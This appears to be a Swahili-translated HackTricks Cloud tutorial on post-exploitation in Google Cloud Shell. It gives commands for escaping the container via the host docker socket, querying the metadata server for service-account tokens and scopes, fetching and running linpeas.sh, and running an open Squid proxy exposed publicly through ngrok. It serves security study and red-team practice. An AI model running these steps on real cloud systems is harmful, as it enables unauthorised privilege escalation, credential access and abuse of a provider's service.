# GCP - Uchimbaji wa Baada ya Kufanikiwa kwa Cloud Shell

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)
* &#x20;repos za github.

</details>

## Cloud Shell

Kwa habari zaidi kuhusu Cloud Shell angalia:

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### Kutoroka kwa Kontena

Tafadhali kumbuka kuwa Google Cloud Shell inaendeshwa ndani ya kontena, unaweza **kutoroka kwa urahisi kwenda kwenye mwenyeji** kwa kufanya:

{% code overflow="wrap" %}
```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```
{% endcode %}

Hii haichukuliwi kama udhaifu na google, lakini inakupa wigo mpana wa kinachoendelea katika mazingira hayo.

Zaidi ya hayo, kumbuka kwamba kutoka kwenye mwenyeji unaweza kupata ishara ya akaunti ya huduma:
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
{% endcode %}

Na scopes zifuatazo:

{% code overflow="wrap" %}
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"

https://www.googleapis.com/auth/devstorage.read_only
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
Tambua metadata kwa kutumia LinPEAS:

{% code overflow="wrap" %}
```bash
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sh linpeas.sh -o cloud
```
{% endcode %}

Baada ya kutumia [https://github.com/carlospolop/bf\_my\_gcp\_permissions](https://github.com/carlospolop/bf\_my\_gcp\_permissions) na token ya Akaunti ya Huduma **hakuna idhini iliyogunduliwa**...

### Tumia kama Proksi

Ikiwa unataka kutumia kifaa chako cha ganda la google cloud kama proksi unahitaji kukimbia amri zifuatazo (au uzijumuishe katika faili ya .bashrc):
```bash
sudo apt install -y squid
```
Kwa kujua tu, Squid ni seva ya proksi ya http. Unda faili ya **squid.conf** na mipangilio ifuatayo:
```bash
http_port 3128
cache_dir /var/cache/squid 100 16 256
acl all src 0.0.0.0/0
http_access allow all
```
Copy the **squid.conf** file to **/etc/squid**  
Hakikisha kwamba unakili faili ya **squid.conf** kwenda **/etc/squid**
```bash
sudo cp squid.conf /etc/squid
```
Mwishowe zindua huduma ya squid:
```bash
sudo service squid start
```
Tumia ngrok ili kuwezesha proksi iweze kupatikana kutoka nje:
```bash
./ngrok tcp 3128
```
Baada ya kukimbia nakili url ya tcp://. Ikiwa unataka kukimbia proksi kutoka kwenye kivinjari inashauriwa kuondoa sehemu ya tcp:// na namba ya mlango na kuweka mlango kwenye uga wa mlango wa mipangilio ya proksi ya kivinjari chako (squid ni seva ya proksi ya http).

Kwa matumizi bora wakati wa kuanza .bashrc faili inapaswa kuwa na mistari ifuatayo:
```bash
sudo apt install -y squid
sudo cp squid.conf /etc/squid/
sudo service squid start
cd ngrok;./ngrok tcp 3128
```
Maagizo yalichukuliwa kutoka [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key). Angalia ukurasa huo kwa mawazo mengine ya kufanya kazi na aina yoyote ya programu (databases na hata windows) kwenye Cloud Shell.

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
